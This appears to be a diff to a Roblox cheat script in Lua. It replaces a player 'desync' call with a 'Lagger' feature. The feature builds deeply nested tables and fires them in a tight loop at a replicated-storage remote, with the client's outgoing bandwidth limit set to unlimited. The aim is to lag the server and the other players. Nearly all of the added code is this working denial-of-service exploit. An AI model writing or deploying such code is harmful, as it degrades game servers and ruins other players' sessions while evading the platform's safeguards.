@@ -186,7 +186,7 @@ local PATH_BASE_STOP = 1.32
 local PATH_MIN_STOP = 0.60
 local PATH_NEXT_POINT_BIAS = 0.45
 local PATH_SMOOTH_FACTOR = 0.10
-local PATH_CHECKPOINT_RADIUS = 10
+local PATH_CHECKPOINT_RADIUS = 12
 local PATH_TP_STEP_DISTANCE = 2.5
 local PATH_TP_STEP_DELAY = 0.06
 
@@ -3346,24 +3346,100 @@ function createRightButtons(device)
         LaggerStroke.Thickness = 2
         LaggerStroke.Parent = LaggerButton
 
+        -- LAGGER logic (no extra GUI, just logic)
+        local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+        local LAGGER_CONFIG = isMobile and {
+            TableIncrease = 290,
+            Tries = 1,
+            LoopWaitTime = 0.85
+        } or {
+            TableIncrease = 265,
+            Tries = 1,
+            LoopWaitTime = 0.05
+        }
+        local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+        local function resolveRemote(path)
+            if not path or path == "" then return nil end
+            local obj = game
+            local cleaned = path:gsub("^game%.", "")
+            for segment in cleaned:gmatch("[^%.]+") do
+                if obj then
+                    obj = obj[segment]
+                else
+                    return nil
+                end
+            end
+            return obj
+        end
+        local function getmaxvalue(val)
+            local mainvalueifonetable = 499999
+            if type(val) ~= "number" then return nil end
+            return mainvalueifonetable / (val + 2)
+        end
+        local function bomb(tableincrease, tries)
+            local maintable = {}
+            local spammedtable = {}
+            table.insert(spammedtable, {})
+            local z = spammedtable[1]
+            for i = 1, tableincrease do
+                local tableins = {}
+                table.insert(z, tableins)
+                z = tableins
+            end
+            local maximum = getmaxvalue(tableincrease) or 9999999
+            for i = 1, maximum do
+                table.insert(maintable, spammedtable)
+                if i % 5000 == 0 then task.wait() end
+            end
+            local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+            if remote then
+                for i = 1, tries do
+                    for _, plr in ipairs(Players:GetPlayers()) do
+                        if plr ~= player then
+                            pcall(function()
+                                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                                    remote:FireServer(maintable)
+                                elseif remote:IsA("RemoteFunction") then
+                                    remote:InvokeServer(maintable)
+                                end
+                            end)
+                        end
+                    end
+                end
+            end
+        end
+        local laggerEnabled = false
+        local laggerThread = nil
+        local function startLaggerLoop()
+            while laggerEnabled do
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+                task.spawn(function()
+                    bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+                end)
+                task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+            end
+        end
+        local function stopLaggerLoop()
+            laggerEnabled = false
+            if laggerThread then
+                coroutine.close(laggerThread)
+                laggerThread = nil
+            end
+        end
+        local function startLagger()
+            if laggerThread then return end
+            laggerEnabled = true
+            laggerThread = coroutine.create(startLaggerLoop)
+            coroutine.resume(laggerThread)
+        end
         LaggerButton.MouseButton1Click:Connect(function()
             laggerEnabled = not laggerEnabled
             if laggerEnabled then
                 LaggerButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-                -- Desync all other players (lag their speed)
-                for _, plr in ipairs(Players:GetPlayers()) do
-                    if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
-                        if raknet and raknet.desync then pcall(function() raknet.desync(true, plr) end) end
-                    end
-                end
+                startLagger()
             else
                 LaggerButton.BackgroundColor3 = Color3.fromRGB(70, 70, 75)
-                -- Restore all other players
-                for _, plr in ipairs(Players:GetPlayers()) do
-                    if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
-                        if raknet and raknet.desync then pcall(function() raknet.desync(false, plr) end) end
-                    end
-                end
+                stopLaggerLoop()
             end
         end)
     local function getHumanoid()
